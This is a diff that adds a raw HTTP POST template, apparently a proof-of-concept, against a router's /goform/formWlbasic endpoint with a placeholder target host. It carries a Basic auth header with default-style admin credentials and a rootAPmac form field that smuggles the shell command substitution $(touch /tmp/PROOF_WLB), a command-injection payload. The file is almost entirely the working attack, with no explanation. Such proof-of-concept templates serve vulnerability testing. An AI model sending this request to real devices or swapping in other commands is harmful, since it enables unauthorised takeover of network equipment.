@@ -1,0 +1,7 @@
+POST /goform/formWlbasic HTTP/1.1
+Host: {{target}}
+Authorization: Basic YWRtaW46MTIzNA==
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+
+doConnectTest=1&rootAPmac=x'%24%28touch%20%2Ftmp%2FPROOF_WLB%29'y
